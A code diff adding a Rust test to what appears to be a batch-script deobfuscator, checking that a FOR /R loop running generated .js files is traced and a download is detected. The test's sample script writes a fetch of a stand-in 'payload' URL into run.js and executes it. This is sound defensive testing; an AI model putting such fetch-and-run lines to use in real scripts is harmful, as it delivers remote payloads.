@@ -15482,6 +15482,33 @@ for /D %%D in (C:\Temp\*) do call %%D\run.js"#;
 }
 
 #[cfg(test)]
+mod for_r_tests {
+    use crate::traits::Trait;
+    use crate::{analyze, Config};
+
+    #[test]
+    fn for_r_wildcard_over_tracked_files_feeds_later_script_execution() {
+        let script = br#"echo fetch('https://for-r-file.example/payload') > C:\Work\Sub\run.js
+for /R C:\Work %%F in (*.js) do call %%F"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.deobfuscated.contains(r#"call c:\work\sub\run.js"#),
+            "FOR /R did not substitute tracked file:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://for-r-file.example/payload")
+            }),
+            "FOR /R file execution did not analyze generated script: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+}
+
+#[cfg(test)]
 mod synth_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::synth::run_pipeline;
